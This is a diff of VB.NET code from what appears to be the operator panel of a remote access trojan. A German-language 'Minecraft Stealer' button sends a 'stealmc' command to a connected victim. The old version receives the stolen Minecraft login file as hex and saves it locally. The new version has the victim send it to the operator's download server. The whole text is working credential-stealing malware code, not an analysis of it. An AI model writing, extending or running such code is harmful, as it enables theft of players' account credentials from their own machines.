@@ -130,25 +130,11 @@ Public Class Controll
     End Sub
 
     Private Sub Button6_Click_1(sender As Object, e As EventArgs) Handles Button6.Click
-        Dim sf As New SaveFileDialog
-        sf.Filter = "All Files (*.*)|*"
-        sf.Title = "Minecraft Stealer - Bitte geben sie den Ordner an"
-        If sf.ShowDialog = Windows.Forms.DialogResult.OK Then
-            Connection.w.WriteLine("stealmc")
-            Connection.w.Flush()
-            Dim lastlogindata As String = Connection.r.ReadLine()
-            'MsgBox(lastlogindata, MsgBoxStyle.Critical, "")
-            Dim vByteBuffer(lastlogindata.Length + 1) As Byte
-            Dim vHexChar As String = String.Empty
-            For i As Integer = 0 To (lastlogindata.Length - 1) Step 2
-                vHexChar = lastlogindata(i) & lastlogindata(i + 1)
-                vByteBuffer(i / 2) = Byte.Parse(vHexChar, Globalization.NumberStyles.HexNumber)
-            Next
-            Using vFs As New FileStream(sf.FileName, FileMode.Create)
-                vFs.Write(vByteBuffer, 0, vByteBuffer.Length)
-            End Using
+        If InfoBrief.PortDownloadServer = 0 Then
+            MsgBox("Sie müssen den DownloadServer starten!", MsgBoxStyle.Exclamation, "")
         Else
-            MsgBox("Sie haben der Vorgang Abgebrochen", MsgBoxStyle.Information, "Manual")
+            Connection.w.WriteLine("stealmc|" & InfoBrief.PortDownloadServer)
+            Connection.w.Flush()
         End If
     End Sub
 
